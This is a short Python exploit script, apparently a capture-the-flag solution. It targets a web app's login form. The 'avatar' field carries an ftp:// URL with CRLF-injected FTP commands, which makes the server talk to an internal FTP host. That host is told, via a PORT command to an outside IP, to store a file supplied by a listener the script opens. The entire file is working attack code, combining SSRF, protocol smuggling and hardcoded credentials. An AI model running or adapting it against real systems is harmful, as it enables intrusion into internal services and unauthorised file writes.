#!/usr/bin/python3

import urllib.parse
import requests
import string
import random
import socket
import re

upload_name = "test.txt"
upload_contents = "Hello, world!"

upload_port = 9001
upload_host = "140.113.24.143"
upload = '{},{},{}'.format(upload_host.replace('.', ','), upload_port >> 8, upload_port & 0xff)

ftp_cmds = [
    "USER fan",
    "PASS root",
    'TYPE A', # A = ascii, I = binary
    'PORT ' + upload, # active mode target
    'STOR ' + upload_name, # filename
    'yep',
    'yep',
    'yep'
]

ftp_host = "172.29.0.2:8877"
target = 'ftp://fan\r\n{}:root@'.format('\r\n'.join(ftp_cmds)) + ftp_host

print(target)

def randstr():
    alphabet = list(string.ascii_lowercase + string.digits)
    return ''.join([random.choice(alphabet) for _ in range(32)])

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("0.0.0.0", upload_port))
sock.listen(1)

s = "localhost:8088"
r = requests.post(f"http://{s}/login", data={"username": randstr(), "password": "12345", "avatar": target, "submit": "Go!"})

target_conn, addr = sock.accept()
print(addr)
target_conn.sendall(upload_contents.encode())